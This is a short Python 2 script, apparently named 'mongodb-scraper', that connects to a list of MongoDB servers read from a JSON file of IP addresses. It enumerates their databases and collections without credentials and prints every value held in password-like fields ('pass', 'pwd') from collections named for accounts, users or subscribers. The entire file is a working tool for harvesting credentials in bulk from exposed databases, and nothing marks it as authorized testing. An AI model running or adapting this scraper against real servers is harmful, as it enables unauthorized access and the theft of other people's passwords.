import logging
import json
from colorlog import ColoredFormatter
from pymongo import MongoClient

try:
    with open('data.json', 'r') as data_json:
        ips = json.load(data_json)
except (IOError, ValueError):
    print "Please provide a valid JSON encoded file in data.json"
    exit()

mongo_logger = logging.getLogger('mongodb-scraper')
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s|%(levelname)-8s: %(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S',
                    filename='mongodb-scraper.log')

console = logging.StreamHandler()
console.setLevel(logging.INFO)

formatter = ColoredFormatter("%(log_color)s[%(levelname)-4s] %(message)s%(reset)s")
console.setFormatter(formatter)
mongo_logger.addHandler(console)

table_names = ['account', 'user', 'subscriber']
column_names = ['pass', 'pwd']

for ip in ips:
    mongo_logger.info("Connecting to " + ip)
    client = MongoClient(ip)
    dbs = client.database_names()

    mongo_logger.info("Found " + str(len(dbs)) + " databases")
    mongo_logger.debug("Database found: " + ', '.join(dbs))

    for db in dbs:
        # Skip local system databases
        if db in ['admin', 'local']:
            continue

        o_db = client[db]
        try:
            collections = o_db.collection_names()
            mongo_logger.info("\tFound " + str(len(collections)) + " collections")
            mongo_logger.debug("\tCollection found: " + ', '.join(collections))
        except:
            # Don't cry if something bad happens
            mongo_logger.warning("\tAn error occurred while fetching collections from " + ip + ". Skipping.")
            break

        for collection in collections:
            mongo_logger.debug("\t\tAnalyzing collection: " + collection)
            # Is this a collection I'm interested into?
            if not any(table in collection for table in table_names):
                continue

            o_coll = o_db[collection]

            row = o_coll.find_one()
            interesting = False

            for key, value in row.iteritems():
                # Is that a column we're interested into?
                if any(column in key for column in column_names):
                    interesting = True
                    break

            # This collection has no interesting data? Let's skip it
            if not interesting:
                continue

            rows = o_coll.find()
            total = rows.count()

            for row in rows:
                for key, value in row.iteritems():
                    # Is that a column we're interested into?
                    if any(column in key for column in column_names):
                        print value
    client.close()




